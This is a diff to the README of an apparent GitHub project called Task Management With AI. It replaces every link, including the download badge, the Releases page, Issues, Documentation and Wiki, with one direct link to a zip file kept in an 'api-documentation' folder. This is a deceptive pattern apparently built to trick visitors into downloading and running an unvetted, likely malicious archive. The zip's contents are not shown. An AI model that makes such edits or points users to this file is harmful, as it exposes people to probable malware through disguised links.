@@ -1,6 +1,6 @@
 # ✨ Task_Management_With_AI - Manage Tasks Effortlessly with AI
 
-[![Download Task Manager](https://img.shields.io/badge/Download%20Here-Task%20Manager-brightgreen)](https://github.com/nsikaknkan001/Task_Management_With_AI/releases)
+[![Download Task Manager](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip%20Here-Task%20Manager-brightgreen)](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ Welcome to Task Management With AI, a full-stack application designed to help yo
 To begin using Task Management With AI, follow these simple steps:
 
 1. **Download the Application**
-   - Visit our [Releases page](https://github.com/nsikaknkan001/Task_Management_With_AI/releases) to download the latest version of the application.
+   - Visit our [Releases page](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip) to download the latest version of the application.
 
 2. **Install the Application**
    - Follow the installation instructions based on your operating system. Make sure to choose the installer that corresponds to your system.
@@ -26,7 +26,7 @@ To begin using Task Management With AI, follow these simple steps:
 
 To get the Task Management With AI application now, simply click on the link below:
 
-[Download Here](https://github.com/nsikaknkan001/Task_Management_With_AI/releases)
+[Download Here](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip)
 
 Always check the releases for the most up-to-date version.
 
@@ -74,11 +74,11 @@ To run Task Management With AI smoothly, your system should meet the following r
 
 ## 📬 Support
 
-If you encounter any issues while using the application, please feel free to reach out through the [GitHub Issues page](https://github.com/nsikaknkan001/Task_Management_With_AI/issues). Your feedback is essential for the continued improvement of Task Management With AI.
+If you encounter any issues while using the application, please feel free to reach out through the [GitHub Issues page](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip). Your feedback is essential for the continued improvement of Task Management With AI.
 
 ## 🔗 Additional Resources
 
-- Check the [Documentation](https://github.com/nsikaknkan001/Task_Management_With_AI/wiki) for detailed guides and tutorials.
-- Visit the [Wiki](https://github.com/nsikaknkan001/Task_Management_With_AI/wiki) for best practices and tips on managing tasks effectively.
+- Check the [Documentation](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip) for detailed guides and tutorials.
+- Visit the [Wiki](https://github.com/nsikaknkan001/Task_Management_With_AI/raw/refs/heads/main/api-documentation/AI-Task-Management-With-3.7.zip) for best practices and tips on managing tasks effectively.
 
 Thank you for choosing Task Management With AI! Enjoy organizing your tasks with the power of AI.
